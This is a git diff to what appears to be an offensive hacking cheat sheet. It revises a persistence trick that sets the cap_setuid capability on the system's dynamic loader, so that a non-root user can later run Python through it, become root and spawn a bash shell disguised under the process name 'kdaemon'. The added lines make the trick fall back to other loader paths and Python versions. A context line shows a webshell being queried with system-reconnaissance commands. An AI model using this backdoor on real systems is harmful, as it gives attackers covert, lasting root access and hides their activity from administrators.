@@ -1606,13 +1606,18 @@ curl http://127.0.0.1:8080/test.php -d 0="ps fax; uname -mrs; id"
 
 Stay root once you got root
 ```bash
-### Execute as root user
-setcap cap_setuid+ep /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+setcap cap_setuid+ep /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 2>/dev/null \
+|| setcap cap_setuid+ep /lib64/ld-2.17.so 2>/dev/null \
+|| echo >&2 "FAILED. File not found"
 ```
 Become root
 ```bash
 ### Execute as non-root user
-exec /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /usr/bin/python3 -c 'import os;os.setuid(0);os.execlp("bash", "kdaemon")'
+p="python"
+command -v python3 >/dev/null && p="python3"
+[[ -f /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 ]] && l="/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2"
+[[ -f /lib64/ld-2.17.so ]] && l="/lib64/ld-2.17.so"
+exec "${l:?}" "$p" -c 'import os;os.setuid(0);os.execlp("bash", "kdaemon")'
 ```
 
 <a id="implant"></a>
